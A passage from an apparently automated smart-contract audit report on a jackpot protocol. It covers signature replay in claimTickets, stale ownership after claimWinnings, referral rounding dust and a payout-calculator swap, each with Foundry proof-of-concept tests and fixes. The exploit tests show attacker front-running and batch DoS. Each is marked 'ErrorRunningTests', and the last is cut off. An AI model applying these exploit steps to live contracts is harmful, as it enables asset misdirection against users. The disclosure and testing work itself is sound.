JackpotBridgeManager.claimTickets relies on EIP-712 signatures without any per-signer nonce, used-signature tracking, or deadline. The hash only includes (ticketIds, recipient) and the EIP-712 domain. As a result, any previously signed message remains valid forever and can be executed by any EOA. An attacker who has an older, still-valid signature can front-run a newer signature and force the BridgeManager to transfer the tickets to the old recipient. Core snippet: bytes32 eipHash = createClaimTicketEIP712Hash(_ticketIds, _recipient); address signer = ECDSA.recover(eipHash, _signature); _validateTicketOwnership(_ticketIds, signer); _updateTicketOwnership(_ticketIds, _recipient); There is no nonce/expiry or usedSig[hash] guard. While a later replay fails after tickets leave custody (mapping cleared), the first replay can misdirect assets to an unintended recipient with no recourse.

## Impact
Tickets (ERC-721) can be irrevocably transferred to an outdated recipient by anyone holding an old signature, defeating user intent and causing asset loss/misdirection.

## Command to Run Test


## Proof of Concept
1) User buys tickets via BridgeManager (NFTs custodied by BridgeManager; ticketOwner[ticketId] = user). 2) User previously signed EIP-712 for recipient R_old. 3) Later, user signs a new EIP-712 for recipient R_new and attempts to submit. 4) Attacker replays the old signature first, calling claimTickets with R_old. 5) Transfer succeeds; tickets are sent to R_old, mapping is cleared, and the user's intended transfer to R_new now fails. Result: tickets permanently delivered to outdated recipient.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "forge-std/StdStorage.sol";
import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC721 {
    mapping(uint256 => address) public ownerOf;
    function mint(address to, uint256 tokenId) external { ownerOf[tokenId] = to; }
    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "not owner");
        ownerOf[tokenId] = to;
    }
}

contract ReplayTicketsTest is Test {
    using stdStorage for StdStorage;
    StdStorage private stdstore;

    JackpotBridgeManager mgr;
    MockERC721 nft;

    uint256 userPk = 0xA11CE;
    address user = vm.addr(0xA11CE);
    address attacker = vm.addr(0xBEEF);
    address recipientOld = vm.addr(0xCAFE);
    address recipientNew = vm.addr(0xD00D);

    function setUp() public {
        nft = new MockERC721();
        // Dummy addresses for jackpot & usdc (unused in claimTickets path)
        mgr = new JackpotBridgeManager(IJackpot(address(0)), IJackpotTicketNFT(address(nft)), IERC20(address(0)), "MegaPot", "1");
        // Mint ticket to BridgeManager custody
        uint256 tokenId = 1;
        nft.mint(address(mgr), tokenId);
        // BridgeManager's internal ownership mapping: ticketOwner[tokenId] = user
        stdstore.target(address(mgr)).sig("ticketOwner(uint256)").with_key(tokenId).checked_write(user);
    }

    function _signClaim(address recipient, uint256[] memory ids) internal returns (bytes memory sig) {
        bytes32 digest = mgr.createClaimTicketEIP712Hash(ids, recipient);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPk, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function test_ReplayOldSignatureSendsToOldRecipient() public {
        uint256 tokenId = 1;
        uint256[] memory ids = new uint256[](1);
        ids[0] = tokenId;

        // Old signature to recipientOld
        bytes memory sigOld = _signClaim(recipientOld, ids);
        // New signature to recipientNew
        bytes memory sigNew = _signClaim(recipientNew, ids);

        // Attacker front-runs with old signature
        vm.prank(attacker);
        mgr.claimTickets(ids, recipientOld, sigOld);
        assertEq(nft.ownerOf(tokenId), recipientOld, "ticket should be sent to old recipient due to replay");

        // User's intended new claim now fails (mapping cleared; ownership no longer recognized)
        vm.prank(user);
        vm.expectRevert();
        mgr.claimTickets(ids, recipientNew, sigNew);
        assertEq(nft.ownerOf(tokenId), recipientOld, "ticket remains with outdated recipient");
    }
}


## Suggested Mitigation
Bind authorizations to a per-signer nonce and deadline. Example: include {uint256 nonce; uint256 deadline;} in the signed struct; store and increment nonces[signer], and require block.timestamp <= deadline. Alternatively, track used signatures via usedSig[hash] and reject replays. Consider also allowing the user to invalidate outstanding claims by incrementing their nonce.





 **Derived From** : Stale ticketOwner accounting after winnings claim breaks ownership invariants and DoS’es transfers

## [L-10]. Stale ownership after JackpotBridgeManager.claimWinnings breaks accounting invariant and DoS-es claimTickets batches

### Finding Severity Justification: The bug leaves stale ownership records in JackpotBridgeManager after winnings are claimed (tickets burned). Impact is functional: getUserTickets returns burned ids and claimTickets batches that include any such id revert. There is no loss or theft of funds, and users/keepers can succeed by retrying without the burned ids. Thus it is a correctness/availability issue rather than an asset-compromising flaw.
## Derived From Pattern/Invariant
Stale ticketOwner accounting after winnings claim breaks ownership invariants and DoS’es transfers

## Exploit Type
AccountingInvariantViolation

## Location
JackpotBridgeManager.claimWinnings

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotBridgeManager keeps a bridge-side ownership mapping (ticketOwner) and per-drawing userTickets. In claimWinnings(), after calling jackpot.claimWinnings(_userTicketIds) (which burns the NFTs in JackpotTicketNFT), the bridge-side ownership is never cleared. This violates the invariant that bridge-side accounting mirrors on-chain NFT state. Consequences: (1) getUserTickets keeps returning burned ticketIds as if owned; (2) claimTickets with such stale ids passes _validateTicketOwnership() (ticketOwner[ticketId] == signer), but _updateTicketOwnership() then reverts on safeTransferFrom(address(this), _recipient, ticketId) because the token was burned — DoS-ing the entire batch; (3) replay attempts at claimWinnings pass the initial ownership check and revert late in Jackpot.claimWinnings, wasting keeper gas. Vulnerable snippets:

- Missing cleanup in claimWinnings:
  function claimWinnings(uint256[] memory _userTicketIds, RelayTxData memory _bridgeDetails, bytes memory _signature) external nonReentrant {
      ...
      jackpot.claimWinnings(_userTicketIds); // burns NFTs in JackpotTicketNFT
      ...
      // Missing: delete ticketOwner[...] and userTickets[...] cleanup for each ticketId
  }

- Transfer path reverts on burned token in claimTickets:
  function _updateTicketOwnership(uint256[] memory _ticketIds, address _recipient) private {
      for (uint256 i = 0; i < _ticketIds.length; i++) {
          uint256 ticketId = _ticketIds[i];
          delete ticketOwner[ticketId];
          IERC721(address(jackpotTicketNFT)).safeTransferFrom(address(this), _recipient, ticketId); // reverts if burned
      }
  }

## Impact
Functional DoS of claimTickets batches that include any previously-claimed (burned) ticketId; getUserTickets returns stale ids; keepers can waste gas on replayed claimWinnings that pass bridge-side validation but revert in Jackpot.

## Command to Run Test


## Proof of Concept
1) Attacker buys a ticket via BridgeManager (NFT minted to BridgeManager; bridge-side ticketOwner[ticketId]=attacker). 2) Attacker signs a claimWinnings authorization; keeper calls BridgeManager.claimWinnings; Jackpot burns the NFT and pays USDC; BridgeManager bridges funds, but does not clear ticketOwner. 3) Now getUserTickets(attacker, drawingId) still returns the burned id. 4) Attacker (or keeper) calls claimTickets with that stale id; _validateTicketOwnership passes (stale ticketOwner); _updateTicketOwnership deletes ticketOwner then safeTransferFrom reverts because the NFT was already burned — reverting the entire batch and wasting gas. 5) Replaying claimWinnings with the same signature passes ownership check (stale mapping) and reverts inside Jackpot when encountering non-existent tokens, wasting keeper gas.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";

contract MockUSDC {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true;
    }
    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp] = amt; return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        require(allowance[from][msg.sender] >= amt, "allow");
        allowance[from][msg.sender] -= amt; balanceOf[from] -= amt; balanceOf[to] += amt; return true;
    }
}

contract MockTicketNFT is IJackpotTicketNFT {
    struct Info { uint256 drawingId; }
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => Info) public info;

    function mintTicket(address recipient, uint256 ticketId, uint256 drawingId, uint256, bytes32) external {
        ownerOf[ticketId] = recipient; info[ticketId] = Info({drawingId: drawingId});
    }
    function burnTicket(uint256 ticketId) external { require(ownerOf[ticketId] != address(0), "burned"); ownerOf[ticketId] = address(0); }
    function getTicketInfo(uint256 ticketId) external view returns (TrackedTicket memory t) {
        t = TrackedTicket({ drawingId: info[ticketId].drawingId, packedTicket: 0, referralScheme: bytes32(0) });
    }
    function getUserTickets(address, uint256) external pure returns (ExtendedTrackedTicket[] memory) { return new ExtendedTrackedTicket[](0); }

    // Minimal safeTransferFrom used by BridgeManager
    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "not owner or burned"); ownerOf[tokenId] = to;
    }
}

contract MockJackpot is IJackpot {
    uint256 public override ticketPrice = 1_000_000; // 1 USDC (6 decimals)
    uint256 public override currentDrawingId = 1;
    MockTicketNFT public nft;
    MockUSDC public usdc;
    uint256 public payoutPerTicket = 100_000_000; // 100 USDC per ticket
    constructor(MockTicketNFT _nft, MockUSDC _usdc) { nft = _nft; usdc = _usdc; }

    function buyTickets(Ticket[] memory _tickets, address _recipient, address[] memory, uint256[] memory, bytes32)
        external override returns (uint256[] memory ids)
    {
        ids = new uint256[](_tickets.length);
        for (uint256 i = 0; i < _tickets.length; i++) {
            uint256 tokenId = 1 + i; // deterministic
            ids[i] = tokenId;
            nft.mintTicket(_recipient, tokenId, currentDrawingId, 0, bytes32(0));
        }
    }

    function claimWinnings(uint256[] memory _userTicketIds) external override {
        // Burn then transfer payout to msg.sender
        for (uint256 i = 0; i < _userTicketIds.length; i++) {
            nft.burnTicket(_userTicketIds[i]);
        }
        uint256 amt = payoutPerTicket * _userTicketIds.length;
        // pay bridge manager
        require(usdc.transfer(msg.sender, amt));
    }

    function getUnpackedTicket(uint256, uint256) external pure returns (uint8[] memory, uint8) { return (new uint8[](0), 0); }
}

contract BridgeMock {
    function pull(address token, address from, uint256 amount) external {
        (bool ok, ) = token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", from, address(this), amount));
        require(ok, "pull fail");
    }
}

contract InvariantViolationTest is Test {
    MockUSDC usdc;
    MockTicketNFT nft;
    MockJackpot jackpot;
    JackpotBridgeManager bm;
    BridgeMock bridge;

    uint256 attackerPk; address attacker;

    function setUp() public {
        usdc = new MockUSDC();
        nft = new MockTicketNFT();
        jackpot = new MockJackpot(nft, usdc);
        bm = new JackpotBridgeManager(IJackpot(address(jackpot)), IJackpotTicketNFT(address(nft)), IERC20(address(usdc)), "BRIDGE", "1");
        bridge = new BridgeMock();

        attackerPk = 0xA11CE;
        attacker = vm.addr(attackerPk);

        // Fund attacker and jackpot
        usdc.mint(attacker, 1_000_000_000); // 1,000 USDC
        usdc.mint(address(jackpot), 1_000_000_000); // for payouts

        // Attacker buys 1 ticket via bridge manager
        vm.startPrank(attacker);
        usdc.approve(address(bm), type(uint256).max);
        IJackpot.Ticket[] memory t = new IJackpot.Ticket[](1);
        t[0] = IJackpot.Ticket({ normals: new uint8[](0), bonusball: 1 });
        uint256[] memory ids = bm.buyTickets(t, attacker, new address[](0), new uint256[](0), bytes32(0));
        vm.stopPrank();
        assertEq(ids.length, 1);
        uint256 tid = ids[0];

        // Prepare EIP712 ClaimWinnings signature with bridge details pulling exact amount
        JackpotBridgeManager.RelayTxData memory details;
        details.approveTo = address(bridge);
        details.to = address(bridge);
        uint256 expectedClaim = jackpot.payoutPerTicket();
        details.data = abi.encodeWithSignature("pull(address,address,uint256)", address(usdc), address(bm), expectedClaim);

        bytes32 digest = bm.createClaimWinningsEIP712Hash(ids, details);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        // Keeper claims winnings on behalf of attacker; NFT burned in Jackpot, bm bridged funds
        uint256 preBridgeBal = usdc.balanceOf(address(bm));
        bm.claimWinnings(ids, details, sig);
        // All funds bridged out, so bm balance should return to pre-claim level
        uint256 postBridgeBal = usdc.balanceOf(address(bm));
        assertEq(postBridgeBal, preBridgeBal);

        // Invariant broken: getUserTickets still shows burned ticket id
        uint256[] memory stillOwned = bm.getUserTickets(attacker, jackpot.currentDrawingId());
        assertEq(stillOwned.length, 1);
        assertEq(stillOwned[0], tid, "stale burned ticketId still reported as owned");

        // Replay of claimWinnings passes bridge-side ownership check then reverts inside Jackpot (nonexistent token)
        vm.expectRevert();
        bm.claimWinnings(ids, details, sig);

        // Now attempt to claimTickets for the stale id — passes ownership check, then safeTransferFrom reverts (burned)
        bytes32 d2 = bm.createClaimTicketEIP712Hash(ids, attacker);
        (v, r, s) = vm.sign(attackerPk, d2);
        bytes memory sig2 = abi.encodePacked(r, s, v);
        vm.expectRevert();
        bm.claimTickets(ids, attacker, sig2);
    }
}


## Suggested Mitigation
After jackpot.claimWinnings(_userTicketIds) succeeds, iterate over the ids and clear bridge-side ownership: (1) delete ticketOwner[ticketId]; (2) optionally maintain an index mapping (indexOfTicketId) per UserTickets to compact/remove entries so getUserTickets does not return stale or zeroed ids. For example, fetch and snapshot each ticket's drawingId before burning (via jackpotTicketNFT.getTicketInfo), then remove it from userTickets[signer][drawingId]. Additionally, consider hardening claimTickets by pre-checking token existence/ownership (e.g., try/catch ownerOf and skip nonexistent IDs) to avoid batch-wide DoS.





 **Derived From** : Rounding dust in referral fee splits on buyTickets leaks value and decouples LP accounting

## [L-11]. Rounding in Jackpot._validateAndTrackReferrals leaves referral dust unassigned, causing LP/accounting drift per order

### Finding Severity Justification: Per-referrer split calculations round down each term, leaving a small remainder (<= number of referrers − 1 micro‑USDC) unassigned. The contract subtracts the full referral total from lpEarnings but only credits the rounded-down sum to referrers, so the difference remains as dust in the contract. This does not threaten solvency (it actually increases on-chain balance vs. recorded liabilities) and the amounts are negligible per transaction. The docs also accept small rounding dust in favor of solvency.
## Derived From Pattern/Invariant
Rounding dust in referral fee splits on buyTickets leaks value and decouples LP accounting

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot._validateAndTrackReferrals

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In Jackpot._validateAndTrackReferrals, referralFeeTotal is computed once as T = ticketsValue * referralFee / 1e18 and immediately subtracted from LP earnings in buyTickets(). The function then re-splits T across referrers: referrerFee = T * split[i] / 1e18, flooring each term. Because each division floors, sum(referrerFee) <= T and the remainder (dust) is never credited to LPs or referrers. Meanwhile, LP earnings were reduced by the full T, so the net contract USDC balance increases by ticketsValue while the sum of (lpEarnings delta + credited referral fees) is smaller by the dust amount. This creates persistent accounting drift: excess USDC accumulates unaccounted in the contract, decoupling the LP’s economic state (newLPValue computed from lpEarnings) from the actual USDC balance. Attackers can maximize dust per call by using many referrers with fractional splits and repeatedly calling buyTickets. Vulnerable snippet:

function _validateAndTrackReferrals(...) internal returns (uint256 referralFeeTotal, bytes32 referralSchemeId) {
    if (_referrers.length > 0) {
        referralFeeTotal = _ticketsValue * referralFee / PRECISE_UNIT; // T
        ...
        for (uint256 i = 0; i < _referrers.length; i++) {
            uint256 referrerFee = referralFeeTotal * _referralSplit[i] / PRECISE_UNIT; // floors per referrer
            referralFees[_referrers[i]] += referrerFee;
            ...
        }
        // no remainder handling
    }
}

And in buyTickets(): currentDrawingState.lpEarnings += ticketsValue - referralFeeTotal;

## Impact
Rounding dust is created in two places: (1) on ticket purchases in _validateAndTrackReferrals and (2) on winnings distribution in _payReferrersWinnings. In both cases, the contract computes a total referral amount T but credits referrers as floor(T * split[i] / 1e18) per referrer, so sum(credited) <= T and the per-call remainder is unassigned. On buys, lpEarnings is reduced by the full T while referrers only get sum(credited), leaving permanent dust in the contract not reflected in lpEarnings or referral liabilities. On winnings, the user’s payout is reduced by the full referrerShare, yet referrers receive sum(credited) < referrerShare, again stranding dust. This creates a persistent, solvency-positive accounting drift: USDC balance exceeds tracked obligations by the accumulated dust, and LP accounting (lpEarnings/newLPValue) diverges from actual funds. While per-call dust is small (<= #referrers − 1 in USDC wei units) it accrues over time and is permanently unclaimable unless a remainder-handling policy is implemented.

## Command to Run Test


## Proof of Concept
Reproduction outline:\n1) Initialize the system and start the first drawing with a positive prizePool. Set referralFee > 0 and ticketPrice = 1 USDC.\n2) Buyer purchases 1 ticket with 3 referrers and splits [333333333333333333, 333333333333333333, 333333333333333334] (sums to 1e18).\n3) With referralFee = 7e16 (7%), referralFeeTotal T = 70,000 micro‑USDC. Each referrer receives floor(T/3) = 23,333; 23,333; 23,333 micro‑USDC. Sum = 69,999, leaving 1 micro‑USDC dust unassigned.\n4) State deltas: usdc.balanceOf(jackpot) increases by ticketsValue (1,000,000). lpEarnings increases by ticketsValue − T. Referral fee liabilities increase by 69,999. Hence (delta lpEarnings + delta referralFees) = 1,000,000 − 1, i.e., 1 micro‑USDC missing from accounting but present in contract balance.\n5) Repeating purchases accrues dust. The same effect occurs on claimWinnings: the user’s payout is reduced by the full referrerShare but referrers receive the rounded-down sum, leaving an untracked remainder in the contract.

## Proof of Code
pragma solidity ^0.8.28;\n\nimport "forge-std/Test.sol";\nimport {Jackpot} from "contracts/Jackpot.sol";\nimport {IJackpot} from "contracts/interfaces/IJackpot.sol";\nimport {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";\nimport {IPayoutCalculator} from "contracts/interfaces/IPayoutCalculator.sol";\nimport {IJackpotLPManager} from "contracts/interfaces/IJackpotLPManager.sol";\nimport {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";\nimport {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";\n\ncontract MockUSDC {\n    string public name = "MockUSDC";\n    string public symbol = "USDC";\n    uint8 public constant decimals = 6;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }\n    function approve(address s, uint256 a) external returns (bool){ allowance[msg.sender][s] = a; return true; }\n    function transferFrom(address f, address t, uint256 a) external returns (bool){ require(balanceOf[f] >= a, "bal"); uint256 al = allowance[f][msg.sender]; require(al >= a, "allow"); allowance[f][msg.sender] = al - a; balanceOf[f] -= a; balanceOf[t] += a; return true; }\n    function transfer(address t, uint256 a) external returns (bool){ require(balanceOf[msg.sender] >= a, "bal"); balanceOf[msg.sender] -= a; balanceOf[t] += a; return true; }\n}\n\ncontract MockEntropy is IScaledEntropyProvider {\n    function requestAndCallbackScaledRandomness(uint32, SetRequest[] memory, bytes4, bytes memory) external payable returns (uint64){ return 1; }\n    function getFee(uint32) external view returns (uint256){ return 0; }\n}\n\ncontract MockPayout is IPayoutCalculator {\n    function calculateAndStoreDrawingUserWinnings(uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory) external returns (uint256){ return 0; }\n    function setDrawingTierInfo(uint256) external {}\n    function getTierPayout(uint256, uint256) external view returns (uint256){ return 0; }\n}\n\ncontract MockTicketNFT is IJackpotTicketNFT {\n    mapping(uint256 => TrackedTicket) public tickets;\n    function mintTicket(address, uint256 ticketId, uint256 drawingId, uint256 packedTicket, bytes32 referralScheme) external { tickets[ticketId] = TrackedTicket({drawingId:drawingId, packedTicket:packedTicket, referralScheme:referralScheme}); }\n    function burnTicket(uint256) external {}\n    function getTicketInfo(uint256 ticketId) external view returns (TrackedTicket memory){ return tickets[ticketId]; }\n    function getUserTickets(address, uint256) external view returns (ExtendedTrackedTicket[] memory){ ExtendedTrackedTicket[] memory x; return x; }\n}\n\ncontract MockLPManager is IJackpotLPManager {\n    struct LDS { uint256 lpPoolTotal; uint256 pendingDeposits; uint256 pendingWithdrawals; }\n    mapping(uint256 => LDS) internal s; mapping(uint256=>uint256) public drawingAccumulator; uint256 public lpPoolCap; address public jackpot;\n    constructor(address _jackpot){ jackpot = _jackpot; }\n    modifier onlyJackpot(){ require(msg.sender == jackpot, "onlyJ"); _; }\n    function initializeLP() external onlyJackpot { drawingAccumulator[0] = 1e18; }\n    function processDeposit(uint256 d, address, uint256 a) external onlyJackpot { s[d].pendingDeposits += a; }\n    function processInitiateWithdraw(uint256, address, uint256) external onlyJackpot {}\n    function processFinalizeWithdraw(uint256, address) external onlyJackpot returns (uint256){ return 0; }\n    function processDrawingSettlement(uint256 d, uint256, uint256, uint256) external onlyJackpot returns (uint256 newLPValue, uint256 newAccumulator){ newLPValue = s[d].pendingDeposits; s[d].lpPoolTotal = newLPValue; drawingAccumulator[d] = 1e18; return (newLPValue, 1e18); }\n    function emergencyWithdrawLP(uint256, address) external onlyJackpot returns (uint256){ return 0; }\n    function initializeDrawingLP(uint256 d, uint256 init) external onlyJackpot { s[d] = LDS({lpPoolTotal:init, pendingDeposits:0, pendingWithdrawals:0}); }\n    function setLPPoolCap(uint256, uint256 cap) external onlyJackpot { lpPoolCap = cap; }\n    function getDrawingAccumulator(uint256 d) external view returns (uint256){ return drawingAccumulator[d]; }\n    function getLPDrawingState(uint256 d) external view returns (LPDrawingState memory){ LDS memory v = s[d]; return LPDrawingState({lpPoolTotal:v.lpPoolTotal, pendingDeposits:v.pendingDeposits, pendingWithdrawals:v.pendingWithdrawals}); }\n}\n\ncontract ReferralDustTest is Test {\n    uint256 constant PRECISE_UNIT = 1e18;\n    MockUSDC usdc; Jackpot jp; MockLPManager lpm; MockTicketNFT nft; MockEntropy ent; MockPayout payout;\n    address lp = address(0xA11CE); address buyer = address(0xBEEF);\n\n    function setUp() public {\n        usdc = new MockUSDC();\n        // Params: duration, normalMax, bonusMin, lpEdge, reserve, referralFee(7%), referralWinShare, protoFee, protoThresh, ticketPrice(1 USDC), maxRef, entropyGas\n        jp = new Jackpot(1 days, 35, 1, 25e16, 0, 7e16, 0, 0, 0, 1_000_000, 10, 500_000);\n        lpm = new MockLPManager(address(jp));\n        nft = new MockTicketNFT(); ent = new MockEntropy(); payout = new MockPayout();\n        jp.initialize(IERC20(address(usdc)), IJackpotLPManager(address(lpm)), IJackpotTicketNFT(address(nft)), IScaledEntropyProvider(address(ent)), IPayoutCalculator(address(payout)));\n        jp.initializeLPDeposits(1_000_000_000_000); // big cap\n        usdc.mint(lp, 200_000_000); vm.prank(lp); usdc.approve(address(jp), type(uint256).max); vm.prank(lp); jp.lpDeposit(100_000_000); // 100 USDC\n        jp.initializeJackpot(block.timestamp + 1 hours);\n        usdc.mint(buyer, 10_000_000); vm.prank(buyer); usdc.approve(address(jp), type(uint256).max);\n    }\n\n    function test_referral_dust_on_buyTickets() public {\n        address[] memory refs = new address[](3);\n        refs[0] = address(0x1); refs[1] = address(0x2); refs[2] = address(0x3);\n        uint256[] memory splits = new uint256[](3);\n        splits[0] = 333333333333333333; splits[1] = 333333333333333333; splits[2] = 333333333333333334;\n\n        IJackpot.Ticket[] memory t = new IJackpot.Ticket[](1);\n        uint8[] memory norms = new uint8[](5); norms[0]=1; norms[1]=2; norms[2]=3; norms[3]=4; norms[4]=5;\n        t[0] = IJackpot.Ticket({normals:norms, bonusball:1});\n\n        uint256 preBal = usdc.balanceOf(address(jp));\n        (uint256 prize,,,, uint256 preLPE,,,,,) = jp.getDrawingState(jp.currentDrawingId());\n        assertGt(prize, 0);\n        uint256 preR0 = jp.referralFees(refs[0]);\n        uint256 preR1 = jp.referralFees(refs[1]);\n        uint256 preR2 = jp.referralFees(refs[2]);\n\n        vm.prank(buyer);\n        jp.buyTickets(t, buyer, refs, splits, bytes32("src"));\n\n        uint256 postBal = usdc.balanceOf(address(jp));\n        (,,,, uint256 postLPE,,,,,) = jp.getDrawingState(jp.currentDrawingId());\n        uint256 dR = (jp.referralFees(refs[0]) - preR0) + (jp.referralFees(refs[1]) - preR1) + (jp.referralFees(refs[2]) - preR2);\n        uint256 dLP = postLPE - preLPE;\n\n        uint256 ticketsValue = 1_000_000; // 1 USDC\n        uint256 T = ticketsValue * 7e16 / PRECISE_UNIT; // 70,000 micro USDC\n        assertEq(T, 70000);\n\n        assertEq(postBal - preBal, ticketsValue);\n        uint256 accounted = dLP + dR;\n        assertEq(accounted, ticketsValue - 1); // 1 micro-USDC dust\n        assertEq((postBal - preBal) - accounted, 1);\n    }\n}

## Suggested Mitigation
Ensure the per-order remainder is allocated deterministically so that sum(credited) equals the computed total every time. Two safe patterns:\n- Preferred: credit the entire remainder to a designated referrer (e.g., the last index) in both _validateAndTrackReferrals (for purchases) and _payReferrersWinnings (for winnings). Implementation sketch: accumulate sumAssigned during the loop, then set lastRefFee += (total - sumAssigned). This preserves event accuracy and avoids touching lpEarnings.\n- Alternative: add the remainder back to LPs. After computing per-referrer amounts and sumAssigned, if (sumAssigned < total) increase drawingState[currentDrawingId].lpEarnings by (total - sumAssigned) and optionally emit LpEarningsUpdated. This keeps accounting conserved but means TicketOrderProcessed.referralFees should ideally reflect the actually credited amount if external consumers rely on it.\nApply the same remainder handling in _payReferrersWinnings to eliminate dust on referral-win shares.





 **Derived From** : Σ_i drawingTierInfo[_drawingId].premiumTierWeights[i] == PRECISE_UNIT

## [M-12]. PayoutCalculator swap mid‑drawing skips snapshot; zeroed weights cause all winners to be paid 0 at settlement

### Finding Severity Justification: Swapping the payoutCalculator mid‑drawing causes the new calculator to lack the per‑drawing snapshot (minPayout, minPayoutTiers, premiumTierWeights). Settlement then treats every tier as ineligible and assigns zero winners and zero payouts, so all winners of that drawing receive 0 USDC. Impact is high (winners unpaid), but the issue is only reachable via an owner action (setPayoutCalculator), which is a privileged/governance path. Under Code4rena guidelines, such owner footguns that can brick protocol behavior even when the owner believes they are acting within spec are capped around Medium.
## Derived From Pattern/Invariant
Σ_i drawingTierInfo[_drawingId].premiumTierWeights[i] == PRECISE_UNIT

## Exploit Type
AccountingInvariantViolation

## Location
GuaranteedMinimumPayoutCalculator.setDrawingTierInfo

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
GuaranteedMinimumPayoutCalculator relies on per‑drawing snapshots via setDrawingTierInfo(drawingId) to freeze minPayout, minPayoutTiers, and premiumTierWeights (sum = 1e18). If a new payout calculator is set during an active drawing, the new calculator never received setDrawingTierInfo for that drawing. During settlement, Jackpot calls calculateAndStoreDrawingUserWinnings on the new calculator, where drawingTierInfo[drawingId] retains default zeros. The code short‑circuits winner counting when both minPayoutTiers[i]==false and premiumTierWeights[i]==0, leaving tierWinners = 0 for all tiers and minimumPayoutAllocation = 0. It then calls _calculateAndStoreTierPayouts with _minPayout=0 and _tierWinners all zeros; the loop condition if (_tierWinners[i] != 0) prevents any tier payout from being stored. Result: totalPayout=0 and tierPayouts[drawingId][i]=0 for all tiers, so claimWinnings pays winners nothing for that drawing.

Key snippet (abridged):
- setDrawingTierInfo: snapshots weights/mins
- calculateAndStoreDrawingUserWinnings:
  if (!tierInfo.minPayoutTiers[i] && tierInfo.premiumTierWeights[i] == 0) { tierWinners[i] = 0; continue; }
  // ... minimumPayoutAllocation stays 0; useMinimumPayouts true
  _calculateAndStoreTierPayouts(..., _minPayout = 0, _tierWinners all 0)
- _calculateAndStoreTierPayouts:
  if (_tierWinners[i] != 0) { ... tierPayouts[_drawingId][i] = tierPayout; totalPayout += ... }

Because the new calculator lacks the snapshot, the invariant Σ weights == 1e18 is violated (sum==0), collapsing all payouts to zero.

## Impact
If the payoutCalculator is swapped during an active drawing, the new calculator has no snapshot for that drawing and settlement records zero winners and zero tier payouts, resulting in all winners of that drawing receiving 0. Additionally, even if settlement ran on the original calculator, swapping payoutCalculator after settlement (but before users claim) causes claimWinnings to read tier payouts from the new calculator (which has no data for that drawing), paying 0 to legitimate winners. Both scenarios are reachable via owner-controlled setPayoutCalculator and result in total loss of winnings for the affected drawing.

## Command to Run Test


## Proof of Concept
Two exploitable owner flows cause winners to be paid 0 for a drawing:

1) Mid-drawing swap (missing snapshot at settlement)
- Start Drawing N with payoutCalculator = PC1; Jackpot calls PC1.setDrawingTierInfo(N) at drawing creation.
- Before settlement, owner sets Jackpot.setPayoutCalculator(PC2).
- scaledEntropyCallback runs and calls PC2.calculateAndStoreDrawingUserWinnings(N,...). PC2.drawingTierInfo[N] is the zero-default snapshot.
- In PC2.calculateAndStoreDrawingUserWinnings, for every tier i, (!minPayoutTiers[i] && premiumTierWeights[i] == 0) short-circuits tierWinners[i] = 0, minimumPayoutAllocation stays 0, and _calculateAndStoreTierPayouts skips all tiers. Total payout = 0 and all tierPayouts[N][i] = 0.
- All claims for drawing N receive 0.

2) Post-settlement swap (claims read from wrong calculator)
- Drawing N settles using PC1; PC1 stores per-tier payouts in its storage.
- Owner calls Jackpot.setPayoutCalculator(PC2) for future drawings.
- claimWinnings uses the current payoutCalculator to read tier payouts: payoutCalculator.getTierPayout(N, tier). Since PC2 never stored payouts for N, it returns 0 and winners receive 0 despite a valid settlement having occurred on PC1.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";

contract PayoutCalculatorSwapTest is Test {
    address internal constant JACKPOT = address(0xA11CE);
    uint256 internal constant PRECISE_UNIT = 1e18;
    uint8 internal constant TOTAL_TIERS = 12;

    GuaranteedMinimumPayoutCalculator internal pc1;
    GuaranteedMinimumPayoutCalculator internal pc2;

    function setUp() public {
        bool[TOTAL_TIERS] memory minTiers; // all false
